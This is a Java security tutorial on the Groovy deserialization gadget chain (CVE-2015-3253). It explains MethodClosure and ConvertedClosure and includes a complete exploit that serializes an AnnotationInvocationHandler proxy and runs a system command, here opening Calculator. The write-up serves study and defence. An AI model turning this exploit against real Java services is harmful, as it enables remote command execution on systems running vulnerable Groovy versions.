# Java Security Learning—Groovy Chain

Author: H3rmesk1t

Data: 2022.03.12

# Groovy Introduction
[Apache Groovy](https://groovy-lang.org/#:~:text=Apache%20Groovy%20is, and%20functional%20programming.) is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at improving developer productivity thanks to a concise, familiar and easy to learn syntax. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming.

# Groovy Deserialization Vulnerability (CVE-2015-3253)
## Vulnerability Environment
`Groovy` deserialization vulnerability (CVE-2015-3253), the scope of the vulnerability is `Groovy 1.7.0-2.4.3`, configure the `pom.xml` file, and add the following dependencies:

```xml
<dependencies>
    <dependency>
        <groupId>org.codehaus.groovy</groupId>
        <artifactId>groovy</artifactId>
        <version>2.4.1</version>
    </dependency>
</dependencies>
```


## Pre-knowledge
### MethodClosure
`org.codehaus.groovy.runtime.MethodClosure` is a method closure. It receives two parameters during initialization, one is the object and the other is the method name of the object. Follow up on the `doCall` method, which will call the `InvokerHelper#invokeMethod` method to dynamically call the specified method of the specified object.

<div align=center><img src="./images/1.png"></div>

Follow up on the `org.codehaus.groovy.runtime.InvokerHelper#invokeMethod` method. As can be seen from the method parameters, the first parameter is the object that calls the method, the second parameter is the method executed by the call, and the third parameter means the required parameters of the method.

```java
public static Object invokeMethod(Object object, String methodName, Object arguments) {
    if (object == null) {
        object = NullObject.getNullObject();
    }

    if (object instanceof Class) {
        Class theClass = (Class)object;
        MetaClass metaClass = metaRegistry.getMetaClass(theClass);
        return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));
    } else {
        return !(object instanceof GroovyObject) ? invokePojoMethod(object, methodName, arguments) : invokePogoMethod(object, methodName, arguments);
    }
}
```

Use `MethodClosure` to execute system command test code as follows:

```java
package org.h3rmesk1t.Groovy;

import org.codehaus.groovy.runtime.MethodClosure;
import java.lang.reflect.Method;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 2:01 pm
 */
public class GroovyExploit {

    public static void main(String[] args) throws Exception {

        MethodClosure methodClosure = new MethodClosure(Runtime.getRuntime(), "exec");
        Method method = MethodClosure.class.getDeclaredMethod("doCall", Object.class);
        method.setAccessible(true);
        method.invoke(methodClosure, "open -a Calculator");
    }
}
```

<div align=center><img src="./images/2.png"></div>

### String#execute
In `org.codehaus.groovy.runtime.ProcessGroovyMethods`, `Groovy` has added an `execute` method to the `String` type, which returns a `Process` object. Therefore, in `Groovy`, you can directly use the `"ls".execute()` method to execute the system command `ls`.

<div align=center><img src="./images/3.png"></div>

The test code is as follows:

```java
package org.h3rmesk1t.Groovy;

import org.codehaus.groovy.runtime.MethodClosure;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 2:01 pm
 */
public class GroovyExploit {

    public static void main(String[] args) throws Exception {

        MethodClosure methodClosure = new MethodClosure("open -a Calculator.app", "execute");
        methodClosure.call();
    }
}
```

<div align=center><img src="./images/4.png"></div>

### ConvertedClosure
`org.codehaus.groovy.runtime.ConvertedClosure` is a general-purpose adapter for adapting closures to the `Java` interface. `ConvertedClosure` implements the `ConversionHandler` class, and `ConversionHandler` implements the `InvocationHandler`, so `ConvertedClosure` itself is a dynamic proxy class. Later, `AnnotationInvocationHandler` is used to proxy `ConvertedClosure` into the `Map` class, and then deserialize it.

```java
public class ConvertedClosure extends ConversionHandler implements Serializable {}

public abstract class ConversionHandler implements InvocationHandler, Serializable {}
```

The ConvertedClosure constructor receives a `Closure object and a `String` method name, that is, `ConvertedClosure` will proxy the `Closure` object. When its `method` method is called, the `invoke` method of the parent class `ConvertedClosure` will be called, and then the `invokeCustom` method will be called.

```java
public class ConvertedClosure extends ConversionHandler implements Serializable {
    private String methodNa
me;
    private static final long serialVersionUID = 1162833713450835227L;

    public ConvertedClosure(Closure closure, String method) {
        super(closure);
        this.methodName = method;
    }

    public ConvertedClosure(Closure closure) {
        this(closure, (String)null);
    }

    ......
}
```

```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
    VMPlugin plugin = VMPluginFactory.getPlugin();
    if (plugin.getVersion() >= 7 && this.isDefaultMethod(method)) {
        ......
    } else if (!this.checkMethod(method)) {
        try {
            return this.invokeCustom(proxy, method, args);
        } catch (GroovyRuntimeException var6) {
            throw ScriptBytecodeAdapter.unwrap(var6);
        }
    } else {
        ......
    }
}
```

```java
public class ConvertedClosure extends ConversionHandler implements Serializable {
    ......
    public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable {
        return this.methodName != null && !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args);
    }
}
```

## EXP
```java
package org.h3rmesk1t.Groovy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 2:01 pm
 */
public class GroovyExploit {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws Exception {

        // Encapsulate the object to be executed
        MethodClosure methodClosure = new MethodClosure("open -a Calculator", "execute");
        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "entrySet");

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // Create a dynamic proxy class instance of ConvertedClosure
        Map map = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, convertedClosure);
        
        // Initialize AnnotationInvocationHandler with dynamic proxy
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

        // Generate exp
        String exp = serialize(invocationHandler);
        System.out.println(exp);
        // Trigger exp
        unserialize(exp);
    }
}
```

<div align=center><img src="./images/5.png"></div>

## Call chain

```java
AnnotationInvocationHandler.readObject()
    Map.entrySet() (Proxy)
        ConversionHandler.invoke()
            ConvertedClosure.invokeCustom()
		        MethodClosure.call()
                    ProcessGroovyMethods.execute()
```

## Summarize
### Usage Instructions
When deserializing the `AnnotationInvocationHandler`, the `entrySet` object in `memberValues` is called. This object is `ConvertedClosure`, and this object is actually a proxy for the `MethodClosure` object. It defines that when calling the `entrySet` method, the `invoke` method will be called to call `MethodCl.
The `call` method of osure` triggers the `execute` method of type `String` in Groovy` to execute the command.

### Gadget
 - kick-off gadget: sun.reflect.annotation.AnnotationInvocationHandler#readObject
 - sink gadget: org.codehaus.groovy.runtime.MethodClosure#doCall
 - chain gadget: org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom